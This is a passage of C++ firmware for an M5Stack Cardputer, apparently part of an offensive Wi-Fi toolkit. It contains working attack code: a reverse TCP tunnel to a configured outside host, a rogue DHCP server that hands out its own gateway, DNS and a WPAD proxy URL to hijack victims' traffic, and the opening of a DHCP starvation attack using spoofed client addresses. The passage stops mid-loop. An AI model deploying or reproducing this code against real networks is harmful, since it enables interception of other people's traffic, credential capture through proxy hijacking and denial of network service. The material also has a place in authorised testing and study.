        String line = file.readStringUntil('\n');
        fileLines.push_back(line);
    }
    file.close();

    // Affichage avec dÃ©filement
    int displayStart = 0;
    int lineHeight = 10;
    int maxLines = M5.Display.height() / lineHeight;
    bool needsDisplayUpdate = true;
    M5.Display.setTextSize(1.3);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    
    enterDebounce();
    while (true) {
        if (needsDisplayUpdate) {
            M5.Display.clear(menuBackgroundColor);
            int endLine = min(displayStart + maxLines, (int)fileLines.size());
            for (int i = displayStart; i < endLine; i++) {
                M5.Display.setCursor(2, (i - displayStart) * lineHeight);
                M5.Display.println(fileLines[i]);
            }
            M5.Display.display();
            needsDisplayUpdate = false;
        }

        M5.update();
        M5Cardputer.update();

        if (M5Cardputer.Keyboard.isKeyPressed(';')) {  // Touche ; pour dÃ©filer vers le haut
            displayStart = max(0, displayStart - 1);
            needsDisplayUpdate = true;
            delay(30);
        } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {  // Touche . pour dÃ©filer vers le bas
            displayStart = min(displayStart + 1, (int)fileLines.size() - maxLines);
            needsDisplayUpdate = true;
            delay(30);
        } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {  // Touche EntrÃ©e pour quitter la visualisation
            break; // Sortir de la visualisation du fichier
        }

        delay(30);
    }
}

// Fonction principale pour dÃ©marrer la liste des scans
void ListNetworkAnalysis() {
    std::vector<String> scanFiles = listScanFiles();
    if (scanFiles.empty()) {
        M5.Display.clear(menuBackgroundColor);
        M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
        M5.Display.println("No scan files found.");
        M5.Display.display();
        delay(2000);
        return;
    }

    displayFileList(scanFiles);
    waitAndReturnToMenu("Return to menu.");
}

/*
============================================================================================================================
// reverseTCPTunnel
============================================================================================================================
*/

bool isBackspacePressed() {
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
    Serial.println(F("Touche BACKSPACE dÃ©tectÃ©e, retour au menu."));
    return true;
  }
  return false;
}

void reverseTCPTunnel() {

  if (WiFi.localIP().toString() == "0.0.0.0") {
      waitAndReturnToMenu("Not connected...");
      return;
  }

  if (tcp_host == ""){
      waitAndReturnToMenu("Error check tcp_host in config file");
      return;
  }
  
  createCaptivePortal();
  
  M5.Display.clear();
  M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
  WiFiClient client;
  
  bool running = true;
  while (running) {
    handleDnsRequestSerial();
    M5Cardputer.update();
    
    M5.Display.clear();
    M5.Display.setCursor(20, M5.Display.height() / 2);
    M5.Display.println("Attempting to connect...");
    
    unsigned long previousAttemptTime = 0;
    const unsigned long attemptInterval = 5000;
    bool attemptingConnection = true;

    while (attemptingConnection && running) {
        handleDnsRequestSerial();
        M5Cardputer.update();
        
        // Check for return to menu
        if (isBackspacePressed()) {
          running = false;
          M5.Display.clear();
          M5.Display.setCursor(20, M5.Display.height() / 2);
          M5.Display.println("Returning to menu...");
          break;
        }

        if (millis() - previousAttemptTime >= attemptInterval) {
            previousAttemptTime = millis();

            if (client.connect(tcp_host.c_str(), tcp_port)) {
                M5.Display.clear();
                M5.Display.setCursor(20, M5.Display.height() / 2);
                M5.Display.println("Connection established.");
                attemptingConnection = false;
            } else {
                if (WiFi.status() != WL_CONNECTED) {
                  WiFi.begin(ssid.c_str(), password.c_str());
                }
                M5.Display.clear();
                M5.Display.setCursor(20, M5.Display.height() / 2);
                M5.Display.println("Trying to connect...");
            }
        }
    }

    if (!running) break;

    M5.Display.clear();
    M5.Display.setCursor(30, M5.Display.height() / 2);
    M5.Display.println("TCP tunnel Connected.");

    while (client.connected() && running) {
      M5Cardputer.update();
      handleDnsRequestSerial();
      handleDataTransfer(client);
      delay(10);
      
      // Check for return to menu
      if (isBackspacePressed()) {
        running = false;
        break;
      }
    }

    client.stop();
    M5.Display.clear();
    M5.Display.setCursor(20, M5.Display.height() / 2);
    M5.Display.println("Connection closed.");
    delay(1000); // Short delay for user to read the information
  }
  waitAndReturnToMenu("Return to menu.");
}

void handleDataTransfer(WiFiClient &client) {
  if (client.available()) {
    Serial.println(F("Data received from server, connecting to local web server..."));
    WiFiClient localClient;
    if (!localClient.connect("127.0.0.1", 80)) {
      Serial.println(F("Failed to connect to local web server on port 80."));
      return;
    }
    Serial.println(F("Connected to local web server on port 80."));

    String request = "";
    unsigned long reqTimeout = millis();
    const int bufferSize = 1024;
    char buffer[bufferSize + 1];
    bool headersReceived = false;
    int contentLength = 0;

    // Read headers
    while (client.connected() && (millis() - reqTimeout < 20000)) {
      handleDnsRequestSerial();
      M5Cardputer.update();

      if (isBackspacePressed()) {
        client.stop();
        localClient.stop();
        return;
      }

      int len = client.available();
      if (len > 0) {
        if (len > bufferSize) len = bufferSize;
        int readLen = client.readBytes(buffer, len);
        buffer[readLen] = '\0';
        request += buffer;
        reqTimeout = millis();
        if (request.indexOf("\r\n\r\n") != -1) {
          headersReceived = true;
          break;
        }
      }
      delay(1);
    }

    if (!headersReceived) {
      Serial.println(F("Timeout or incomplete headers received from client."));
      client.stop();
      localClient.stop();
      return;
    }

    // Check if there is a request body to read
    int contentLengthIndex = request.indexOf("Content-Length: ");
    if (contentLengthIndex != -1) {
      int endOfContentLength = request.indexOf("\r\n", contentLengthIndex);
      String contentLengthValue = request.substring(contentLengthIndex + 16, endOfContentLength);
      contentLength = contentLengthValue.toInt();
    }

    // Calculate the position of the end of headers
    int headersEndIndex = request.indexOf("\r\n\r\n") + 4;
    int bodyBytesRead = request.length() - headersEndIndex;

    // Read the request body if necessary
    while (bodyBytesRead < contentLength && (millis() - reqTimeout < 20000)) {
      handleDnsRequestSerial();
      M5Cardputer.update();

      if (isBackspacePressed()) {
        client.stop();
        localClient.stop();
        return;
      }

      int len = client.available();
      if (len > 0) {
        if (len > bufferSize) len = bufferSize;
        int readLen = client.readBytes(buffer, len);
        buffer[readLen] = '\0';
        request += buffer;
        bodyBytesRead += readLen;
        reqTimeout = millis();
      }
      delay(1);
    }

    if (bodyBytesRead < contentLength) {
      Serial.println(F("Timeout or incomplete request body received from client."));
      client.stop();
      localClient.stop();
      return;
    }

    // Modify Host header if necessary
    int hostIndex = request.indexOf("Host: ");
    if (hostIndex != -1) {
      int endOfHost = request.indexOf("\r\n", hostIndex);
      if (endOfHost != -1) {
        request = request.substring(0, hostIndex) + "Host: 127.0.0.1:80" + request.substring(endOfHost);
      }
    }

    // Send the complete request to the local server
    localClient.print(request);
    //Serial.print(request);

    Serial.println(F("Waiting for response from local web server..."));
    unsigned long respTimeout = millis();
    const int responseBufferSize = 1024;
    uint8_t responseBuffer[responseBufferSize];
    while (localClient.connected() || localClient.available()) {
      handleDnsRequestSerial();
      M5Cardputer.update();

      if (isBackspacePressed()) {
        client.stop();
        localClient.stop();
        return;
      }

      int len = localClient.available();
      if (len > 0) {
        if (len > responseBufferSize) len = responseBufferSize;
        int readLen = localClient.read(responseBuffer, len);
        client.write(responseBuffer, readLen);
        Serial.write(responseBuffer, readLen);
        respTimeout = millis();
      } else if (millis() - respTimeout > 2000) {
        Serial.println(F("Timeout while reading response from local web server."));
        break;
      }
      delay(1);
    }
    localClient.stop();
    Serial.println(F("Connection to local web server closed."));
  }
  delay(10);
}


/*
============================================================================================================================
// Rogue DHCP
============================================================================================================================
*/
#include <WiFiUdp.h>

WiFiUDP udp;
unsigned int localUdpPort = 67; // DHCP Port
IPAddress rogueIPRogue;              // Use the IP address obtained by the ESP32

IPAddress currentSubnetRogue;
IPAddress currentGatewayRogue;
IPAddress currentDNSRogue;
uint8_t offeredIpSuffixRogue = 101; // IP suffix used for DHCP offer
int cursorPositionRogue = 10;         // Initial cursor position
const int maxLinesRogue = 10;         // Number of lines to display
String displayLinesRogue[10];         // Array to store the last lines
int currentLineRogue = 0;             // Index of the current line

uint8_t availableIpSuffixesRogue[] = {101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111};
const int numAvailableIps = sizeof(availableIpSuffixesRogue) / sizeof(availableIpSuffixesRogue[0]);
bool ipAllocatedRogue[numAvailableIps] = {false}; // Track allocated IPs

#define MAX_CLIENTS 10
struct ClientInfo {
  uint8_t mac[6];
  uint8_t ipSuffix;
};

static std::vector<ClientInfo> clients;

void initClients() {
  if ((int)clients.size() < MAX_CLIENTS) clients.resize(MAX_CLIENTS);
  for (int i = 0; i < MAX_CLIENTS; i++) {
    memset(clients[i].mac, 0, 6);
    clients[i].ipSuffix = 0;
  }
}

void rogueDHCP(RogueDhcpMode mode) {
  if (mode == ROGUE_DHCP_STA) {
    rogueIPRogue       = WiFi.localIP();
    currentSubnetRogue = WiFi.subnetMask();
    currentGatewayRogue= WiFi.localIP();
    currentDNSRogue    = WiFi.localIP();
    Serial.println(F("[+] Rogue DHCP using STA interface"));
  } else { // ROGUE_DHCP_AP
    rogueIPRogue       = WiFi.softAPIP();
    currentSubnetRogue = WiFi.softAPSubnetMask();
    currentGatewayRogue= WiFi.softAPIP();
    currentDNSRogue    = WiFi.softAPIP();
    WiFi.mode(WIFI_MODE_AP);
    Serial.println(F("[+] Rogue DHCP using AP interface"));
  }

  initClients(); // Initialize client info

  // Stop DHCP interne AP si mode AP (important pour libÃ©rer port 67)
  if (mode == ROGUE_DHCP_AP) {
    tcpip_adapter_dhcps_stop(TCPIP_ADAPTER_IF_AP);
    Serial.println(F("[AP] DHCP server stopped."));
  }

  if (!udp.begin(localUdpPort)) {
    Serial.println(F("Error: UDP port 67 start failed."));
    if (mode == ROGUE_DHCP_AP) {
      tcpip_adapter_dhcps_start(TCPIP_ADAPTER_IF_AP);  // rollback
    }
    waitAndReturnToMenu("Error: UDP start failed.");
    return;
  }

  M5.Display.clear(menuBackgroundColor);
  Serial.println(F("Rogue DHCP running..."));
  updateDisplay("DHCP running...");

  while (true) {
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      Serial.println(F("Returning to menu."));
      updateDisplay("Returning...");
      waitAndReturnToMenu("Return to menu.");
      break;
    }

    int packetSizeRogue = udp.parsePacket();
    if (packetSizeRogue > 0 && packetSizeRogue <= 512) {
      Serial.printf("Received packet, size: %d bytes\n", packetSizeRogue);
      updateDisplay("Packet received");

      uint8_t packetBufferRogue[512];
      udp.read(packetBufferRogue, packetSizeRogue);

      uint8_t messageTypeRogue = getDHCPMessageType(packetBufferRogue, packetSizeRogue);
      uint8_t offeredIpSuffix = 0; 

      if (messageTypeRogue == 1) { // DHCP Discover
        Serial.println(F("DHCP Discover received. Preparing Offer..."));
        updateDisplay("Discover. Preparing Offer...");
        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 2, offeredIpSuffix);
        sendDHCPResponse(packetBufferRogue, packetSizeRogue, false, offeredIpSuffix);
        Serial.println(F("DHCP Offer sent."));
        updateDisplay("Offer sent.");
      } else if (messageTypeRogue == 3) { // DHCP Request
        Serial.println(F("DHCP Request received. Preparing ACK..."));
        updateDisplay("Request. Preparing ACK...");
        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 5, offeredIpSuffix);
        sendDHCPResponse(packetBufferRogue, packetSizeRogue, true, offeredIpSuffix);
        Serial.println(F("DHCP ACK sent."));
        updateDisplay("ACK sent.");
      }
    }
  }

  // Relancer DHCP interne si on Ã©tait en AP
  if (mode == ROGUE_DHCP_AP) {
    tcpip_adapter_dhcps_start(TCPIP_ADAPTER_IF_AP);
    Serial.println(F("[AP] DHCP server (re)started (tcpip_adapter)."));
  }
}



uint8_t getDHCPMessageType(uint8_t *packetRogue, int packetSizeRogue) {
  // DHCP options start after 240 bytes
  int optionsIndexRogue = 240;
  while (optionsIndexRogue < packetSizeRogue) {
    uint8_t optionTypeRogue = packetRogue[optionsIndexRogue++];
    if (optionTypeRogue == 255) {
      break; // End Option
    } else if (optionTypeRogue == 0) {
      continue; // Pad Option, skip
    }
    if (optionsIndexRogue >= packetSizeRogue) break; // Prevent out-of-bounds access
    uint8_t optionLenRogue = packetRogue[optionsIndexRogue++];
    if (optionsIndexRogue + optionLenRogue > packetSizeRogue) break; // Prevent out-of-bounds access
    if (optionTypeRogue == 53 && optionLenRogue == 1) {
      return packetRogue[optionsIndexRogue]; // Return the DHCP message type
    }
    optionsIndexRogue += optionLenRogue; // Skip to the next option
  }
  return 0; // Unknown message type
}

void parseDHCPOptions(uint8_t *packetRogue, int packetSizeRogue, IPAddress &requestedIP, IPAddress &serverID) {
  // DHCP options start after 240 bytes
  int optionsIndexRogue = 240;
  while (optionsIndexRogue < packetSizeRogue) {
    uint8_t optionTypeRogue = packetRogue[optionsIndexRogue++];
    if (optionTypeRogue == 255) {
      break; // End Option
    } else if (optionTypeRogue == 0) {
      continue; // Pad Option, skip
    }
    if (optionsIndexRogue >= packetSizeRogue) break; // Prevent out-of-bounds access
    uint8_t optionLenRogue = packetRogue[optionsIndexRogue++];
    if (optionsIndexRogue + optionLenRogue > packetSizeRogue) break; // Prevent out-of-bounds access

    if (optionTypeRogue == 50 && optionLenRogue == 4) {
      // Requested IP Address
      requestedIP = IPAddress(packetRogue[optionsIndexRogue], packetRogue[optionsIndexRogue + 1], packetRogue[optionsIndexRogue + 2], packetRogue[optionsIndexRogue + 3]);
    } else if (optionTypeRogue == 54 && optionLenRogue == 4) {
      // Server Identifier
      serverID = IPAddress(packetRogue[optionsIndexRogue], packetRogue[optionsIndexRogue + 1], packetRogue[optionsIndexRogue + 2], packetRogue[optionsIndexRogue + 3]);
    }
    optionsIndexRogue += optionLenRogue; // Skip to the next option
  }
}

void prepareDHCPResponse(uint8_t *packetRogue, int &packetSizeRogue, uint8_t messageTypeRogue, uint8_t &offeredIpSuffix) {
  // BOOTREPLY
  packetRogue[0] = 2;

  // Extraire la MAC du client
  uint8_t clientMac[6];
  memcpy(clientMac, &packetRogue[28], 6);

  // RÃ©injecter CHADDR correctement (16 octets total)
  memcpy(&packetRogue[28], clientMac, 6);
  memset(&packetRogue[34], 0, 10);

  // Requested IP et Server ID
  IPAddress requestedIP(0,0,0,0);
  IPAddress serverID(0,0,0,0);
  parseDHCPOptions(packetRogue, packetSizeRogue, requestedIP, serverID);

  offeredIpSuffix = 0;

  // Allocation IP
  if (messageTypeRogue == 2) { // OFFER
    offeredIpSuffix = allocateIpAddress(clientMac);
    if (offeredIpSuffix == 0) {
      Serial.println(F("No available IP addresses."));
      updateDisplay("No available IPs.");
      return;
    }
  } else if (messageTypeRogue == 5) { // ACK
    if (requestedIP != IPAddress(0,0,0,0)) {
      if (requestedIP[0] == rogueIPRogue[0] &&
          requestedIP[1] == rogueIPRogue[1] &&
          requestedIP[2] == rogueIPRogue[2]) {
        uint8_t requestedSuffix = requestedIP[3];
        for (int i=0;i<numAvailableIps;i++) {
          if (availableIpSuffixesRogue[i] == requestedSuffix) {
            if (!ipAllocatedRogue[i]) {
              ipAllocatedRogue[i] = true;
              for (int j=0;j<MAX_CLIENTS;j++) {
                if (clients[j].ipSuffix == 0 || memcmp(clients[j].mac, clientMac, 6)==0) {
                  memcpy(clients[j].mac, clientMac, 6);
                  clients[j].ipSuffix = requestedSuffix;
                  break;
                }
              }
              offeredIpSuffix = requestedSuffix;
              break;
            } else {
              for (int j=0;j<MAX_CLIENTS;j++) {
                if (clients[j].ipSuffix == requestedSuffix && memcmp(clients[j].mac, clientMac, 6)==0) {
                  offeredIpSuffix = requestedSuffix;
                  break;
                }
              }
            }
          }
        }
      }
    } else {
      offeredIpSuffix = allocateIpAddress(clientMac);
      if (offeredIpSuffix == 0) {
        Serial.println(F("No available IP addresses."));
        updateDisplay("No available IPs.");
        return;
      }
    }
  }

  // yiaddr (IP client attribuÃ©e)
  packetRogue[16] = rogueIPRogue[0];
  packetRogue[17] = rogueIPRogue[1];
  packetRogue[18] = rogueIPRogue[2];
  packetRogue[19] = offeredIpSuffix;

  // siaddr (IP serveur)
  packetRogue[20] = rogueIPRogue[0];
  packetRogue[21] = rogueIPRogue[1];
  packetRogue[22] = rogueIPRogue[2];
  packetRogue[23] = rogueIPRogue[3];

  packetRogue[10] = 0x80; 
  packetRogue[11] = 0x00;

  // DHCP Magic Cookie
  packetRogue[236] = 0x63;
  packetRogue[237] = 0x82;
  packetRogue[238] = 0x53;
  packetRogue[239] = 0x63;

  int optionIndexRogue = 240;

  // DHCP Message Type (53)
  packetRogue[optionIndexRogue++] = 53;
  packetRogue[optionIndexRogue++] = 1;
  packetRogue[optionIndexRogue++] = messageTypeRogue;

  // Server Identifier (54)
  packetRogue[optionIndexRogue++] = 54;
  packetRogue[optionIndexRogue++] = 4;
  packetRogue[optionIndexRogue++] = rogueIPRogue[0];
  packetRogue[optionIndexRogue++] = rogueIPRogue[1];
  packetRogue[optionIndexRogue++] = rogueIPRogue[2];
  packetRogue[optionIndexRogue++] = rogueIPRogue[3];

  // Subnet Mask (1)
  packetRogue[optionIndexRogue++] = 1;
  packetRogue[optionIndexRogue++] = 4;
  packetRogue[optionIndexRogue++] = currentSubnetRogue[0];
  packetRogue[optionIndexRogue++] = currentSubnetRogue[1];
  packetRogue[optionIndexRogue++] = currentSubnetRogue[2];
  packetRogue[optionIndexRogue++] = currentSubnetRogue[3];

  // Router (3)
  packetRogue[optionIndexRogue++] = 3;
  packetRogue[optionIndexRogue++] = 4;
  packetRogue[optionIndexRogue++] = rogueIPRogue[0];
  packetRogue[optionIndexRogue++] = rogueIPRogue[1];
  packetRogue[optionIndexRogue++] = rogueIPRogue[2];
  packetRogue[optionIndexRogue++] = rogueIPRogue[3];

  // DNS (6)
  packetRogue[optionIndexRogue++] = 6;
  packetRogue[optionIndexRogue++] = 4;
  packetRogue[optionIndexRogue++] = currentDNSRogue[0];
  packetRogue[optionIndexRogue++] = currentDNSRogue[1];
  packetRogue[optionIndexRogue++] = currentDNSRogue[2];
  packetRogue[optionIndexRogue++] = currentDNSRogue[3];

  // Lease Time (51)
  packetRogue[optionIndexRogue++] = 51;
  packetRogue[optionIndexRogue++] = 4;
  packetRogue[optionIndexRogue++] = 0x00;
  packetRogue[optionIndexRogue++] = 0x01;
  packetRogue[optionIndexRogue++] = 0x51;
  packetRogue[optionIndexRogue++] = 0x80; // 86400s

  // Domain Name (15) â†’ suffixe DNS cohÃ©rent avec Option 252
  const char domainName[] = "evilm5.lan";
  uint8_t domainLen = strlen(domainName);
  packetRogue[optionIndexRogue++] = 15;
  packetRogue[optionIndexRogue++] = domainLen;
  memcpy(&packetRogue[optionIndexRogue], domainName, domainLen);
  optionIndexRogue += domainLen;
  
  // WPAD (252) â†’ URL du proxy
  const char wpadUrl[] = "http://evilm5.lan/wpad.dat";
  size_t wpadLen = strlen(wpadUrl);
  packetRogue[optionIndexRogue++] = 252;
  packetRogue[optionIndexRogue++] = wpadLen;
  memcpy(&packetRogue[optionIndexRogue], wpadUrl, wpadLen);
  optionIndexRogue += wpadLen;
  
  // End Option
  packetRogue[optionIndexRogue++] = 255;

  // Padding alignement 4 octets
  while (optionIndexRogue % 4 != 0) {
    packetRogue[optionIndexRogue++] = 0;
  }

  packetSizeRogue = optionIndexRogue;

  // Affichage IP attribuÃ©e
  char allocatedIpMessage[50];
  sprintf(allocatedIpMessage, "IP: %d.%d.%d.%d",
          rogueIPRogue[0], rogueIPRogue[1], rogueIPRogue[2], offeredIpSuffix);
  updateDisplay(allocatedIpMessage);
}



void sendDHCPResponse(uint8_t *packetRogue, int packetSizeRogue, bool isAck, uint8_t offeredIpSuffix) {
  // Toujours en broadcast car le client n'a pas encore configurÃ© son IP
  udp.beginPacket(IPAddress(255, 255, 255, 255), 68);
  udp.write(packetRogue, packetSizeRogue);
  udp.endPacket();
}



uint8_t allocateIpAddress(uint8_t *clientMac) {
  // Check if this client already has an IP allocated
  for (int i = 0; i < MAX_CLIENTS; i++) {
    if (memcmp(clients[i].mac, clientMac, 6) == 0) {
      // Client found, return the allocated IP suffix
      return clients[i].ipSuffix;
    }
  }

  // Client not found, allocate a new IP
  for (int i = 0; i < numAvailableIps; i++) {
    if (!ipAllocatedRogue[i]) {
      ipAllocatedRogue[i] = true;
      // Store the client info
      for (int j = 0; j < MAX_CLIENTS; j++) {
        if (clients[j].ipSuffix == 0) { // Empty slot
          memcpy(clients[j].mac, clientMac, 6);
          clients[j].ipSuffix = availableIpSuffixesRogue[i];
          return clients[j].ipSuffix;
        }
      }
    }
  }
  return 0; // No available IPs
}


void updateDisplay(const char* message) {
  // Add the new message to the array
  displayLinesRogue[currentLineRogue] = String(message);
  currentLineRogue = (currentLineRogue + 1) % maxLinesRogue;

  // Clear the screen
  M5.Display.clear(menuBackgroundColor);

  // Display the last lines
  M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
  int y = 10;
  for (int i = 0; i < maxLinesRogue; i++) {
    int index = (currentLineRogue - i - 1 + maxLinesRogue) % maxLinesRogue;
    if (!displayLinesRogue[index].isEmpty()) {
      M5.Display.setCursor(5, y);
      M5.Display.println(displayLinesRogue[index]);
      y += 12;
    }
  }

  M5.Display.display();
}




/*
============================================================================================================================
DHCP Starvation
============================================================================================================================
*/

uint32_t totalIPs = 0;

uint32_t calculateTotalIPs(IPAddress subnetMask) {
    uint32_t mask = ((uint32_t)subnetMask[0] << 24) | ((uint32_t)subnetMask[1] << 16) | ((uint32_t)subnetMask[2] << 8) | subnetMask[3];
    uint8_t prefixLength = 0;
    for (int i = 0; i < 32; i++) {
        if (mask & (1UL << (31 - i))) {
            prefixLength++;
        } else {
            break;
        }
    }
    uint8_t hostBits = 32 - prefixLength;
    uint32_t totalIPs = 1UL << hostBits;
    return totalIPs;
}

IPAddress currentIPStarvation;
IPAddress currentSubnet;
IPAddress currentGateway;
IPAddress currentDNS;

// DHCP variables
IPAddress broadcastIP(255, 255, 255, 255);
uint8_t macBase[6] = {0xAE, 0xAD, 0xBE, 0xEF, 0x00, 0x00};
IPAddress dhcpServerIP;
bool dhcpServerDetected = false;
#define DHCP_BUFFER_SIZE 1024
const char* vendorClass   = "EvilClient";

unsigned int localUdpPortStarvation = 67;

uint32_t discoverCount = 0;
uint32_t offerCount = 0;
uint32_t requestCount = 0;
uint32_t ackCount = 0;
uint32_t nakCount = 0;
IPAddress lastAssignedIP;

void saveCurrentNetworkConfig() {
    currentIPStarvation = WiFi.localIP();
    currentSubnet = WiFi.subnetMask();
    currentGateway = WiFi.gatewayIP();
    currentDNS = WiFi.dnsIP();

    totalIPs = calculateTotalIPs(currentSubnet);
    
    Serial.println(F("Current network saved:"));
    Serial.print(F("IP: "));
    Serial.println(currentIPStarvation);
    Serial.print(F("Subnet mask: "));
    Serial.println(currentSubnet);
    Serial.print(F("Gateway: "));
    Serial.println(currentGateway);
    Serial.print(F("DNS: "));
    Serial.println(currentDNS);

    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(5, 5);
    M5.Display.println("Current network saved:");
    M5.Display.printf("IP: %s\n", currentIPStarvation.toString().c_str());
    M5.Display.printf("Subnet: %s\n", currentSubnet.toString().c_str());
    M5.Display.printf("Gateway: %s\n", currentGateway.toString().c_str());
    M5.Display.printf("DNS: %s\n", currentDNS.toString().c_str());
    M5.Display.display();
    delay(2000);
}

void disconnectWiFi() {
    WiFi.disconnect(true);
    Serial.println(F("WiFi disconnected."));
    
    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(5, 5);
    M5.Display.println("WiFi disconnected.");
    M5.Display.display();
    delay(1000);
}

void configureStaticIP() {
    if (!WiFi.config(currentIPStarvation, currentGateway, currentSubnet, currentDNS)) {
        Serial.println(F("Failed to configure static IP."));
        M5.Display.clear(menuBackgroundColor);
        M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
        M5.Display.setCursor(5, 5);
        M5.Display.println("Failed to configure\n static IP.");
        M5.Display.display();
        delay(2000);
    } else {
        Serial.println(F("Static IP configured successfully."));
        M5.Display.clear(menuBackgroundColor);
        M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
        M5.Display.setCursor(5, 5);
        M5.Display.println("Static IP configured \nsuccessfully.");
        M5.Display.display();
        delay(1000);
    }
}

void reconnectWiFi(int networkIndex) {
    Serial.println(F("Reconnecting to WiFi..."));
    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(5, 5);
    M5.Display.println("Reconnecting to WiFi...");
    M5.Display.display();
    
    if (getWifiSecurity(networkIndex) == "Open") {
        Serial.println(F("Network is open, no password required."));
        WiFi.begin(ssid.c_str()); // Connexion sans mot de passe
    } else {
        Serial.println(F("Network requires a password."));
        WiFi.begin(ssid.c_str(), password.c_str());
    }
    
    while (WiFi.status() != WL_CONNECTED) {
        delay(500);
        Serial.print(F("."));
        M5.Display.print(".");
        M5.Display.display();
    }

    Serial.println(F("\nConnected to WiFi."));
    M5.Display.println("\nConnected to WiFi.");
    M5.Display.display();
    delay(1000);
}



void detectDHCPServer() {
    unsigned long startMillis = millis();
    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(5, 5);
    M5.Display.println("Detecting DHCP server...");
    M5.Display.println("Press ENTER to cancel");
    M5.Display.display();
    dhcpServerDetected = false;

    while (millis() - startMillis < 16000) { // Maximum wait time of 16 seconds
        M5.update();
        M5Cardputer.update();

        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
            Serial.println(F("Detection cancelled by user"));
            M5.Display.clear(menuBackgroundColor);
            M5.Display.setCursor(5, 5);
            M5.Display.printf("Detection cancelled");
            M5.Display.display();
            delay(2000);
            return;
        }

           sendDHCPDiscover(macBase); // envoi Discover

          // Attente 5s pour la rÃ©ponse
          unsigned long responseStartMillis = millis();
          while (millis() - responseStartMillis < 5000) {
            int packetSize = udp.parsePacket();
            if (packetSize > 0) {
              uint8_t packetBuffer[DHCP_BUFFER_SIZE];
              int readLen = min(packetSize, (int)sizeof(packetBuffer));
              udp.read(packetBuffer, readLen);
      
              uint8_t messageType = parseDHCPMessageType(packetBuffer, readLen);
              if (messageType == 2) { // DHCP Offer
                // yiaddr = offset 16..19
                dhcpServerIP = IPAddress(packetBuffer[20], packetBuffer[21], 
                                         packetBuffer[22], packetBuffer[23]);
                // VÃ©rif 0.0.0.0
                if (dhcpServerIP.toString() == "0.0.0.0") {
                  Serial.println(F("DHCP server detected as 0.0.0.0. Using gateway as fallback."));
                  dhcpServerIP = currentGateway;
                }
                
                Serial.printf("DHCP server detected: %s\n", dhcpServerIP.toString().c_str());
                M5.Display.printf("DHCP server found:\n%s\n", dhcpServerIP.toString().c_str());
                M5.Display.display();
                dhcpServerDetected = true;
                delay(2000);
                return;
              }
            }
          }
        }
      
        // Aucune offre, fallback
        if (!dhcpServerDetected) {
          dhcpServerIP = currentGateway;
          Serial.println(F("No DHCP server detected. Using gateway as fallback."));
          M5.Display.clear(BLACK);
          M5.Display.println("No DHCP server found.");
          M5.Display.println("Using gateway as fallback:");
          M5.Display.printf("Gateway: %s\n", dhcpServerIP.toString().c_str());
          M5.Display.display();
          delay(2000);
        }
}




int percentage = 0;
bool NAKFlagStarvation = false;
int NAKNumberStarvation = 50;

void startDHCPStarvation() {
      if (WiFi.localIP().toString() == "0.0.0.0") {
        waitAndReturnToMenu("Not connected...");
        return;
    }

    discoverCount = 0;
    offerCount = 0;
    requestCount = 0;
    ackCount = 0;
    nakCount = 0;

    saveCurrentNetworkConfig();
    if (totalIPs == 0) {
        Serial.println(F("Error: Total IPs calculated as zero."));
        M5.Display.clear(menuBackgroundColor);
        M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
        M5.Display.setCursor(5, 5);
        M5.Display.println("Error: Total IPs\ncalculated as zero.\nsettings to 255");
        totalIPs == 255;
        M5.Display.display();
        delay(2000);
    }
    disconnectWiFi();
    configureStaticIP();
    reconnectWiFi(currentListIndex);
    randomSeed(analogRead(0)); // Initialize random generator

    if (!udp.begin(68)) {
        Serial.println(F("Error: Failed to initialize UDP socket on port 68."));
        M5.Display.clear(menuBackgroundColor);
        M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
        M5.Display.setCursor(5, 5);
        M5.Display.println("Error: Failed to init \nUDP socket");
        M5.Display.display();
        delay(2000);
        return;
    }

    Serial.println(F("System initialized. Ready to detect DHCP server..."));
    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(5, 5);
    M5.Display.println("System initialized");
    M5.Display.println("Starting DHCP detection...");
    M5.Display.display();
    delay(1000);

    detectDHCPServer();
    if (dhcpServerDetected) {
        Serial.println(F("DHCP server detected. Starting DHCP Starvation attack..."));
        M5.Display.clear(menuBackgroundColor);
        M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
        M5.Display.setCursor(5, 5);
        M5.Display.println("Starvation running on:");
        M5.Display.printf("DHCP server:\n%s\n", dhcpServerIP.toString().c_str());
        M5.Display.display();
    } else {
        Serial.println(F("No DHCP server detected. Trying with broadcast."));
        M5.Display.clear(menuBackgroundColor);
        M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
        M5.Display.setCursor(5, 5);
        M5.Display.println("Starvation running on:");
        M5.Display.printf("Unknow DHCP server");
        M5.Display.display();
    }

    uint16_t i = 0;
    while (nakCount < NAKNumberStarvation) {
        M5.update();
        M5Cardputer.update();
                
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
            Serial.println(F("Attack stopped by user"));
            M5.Display.println("Attack stopped");
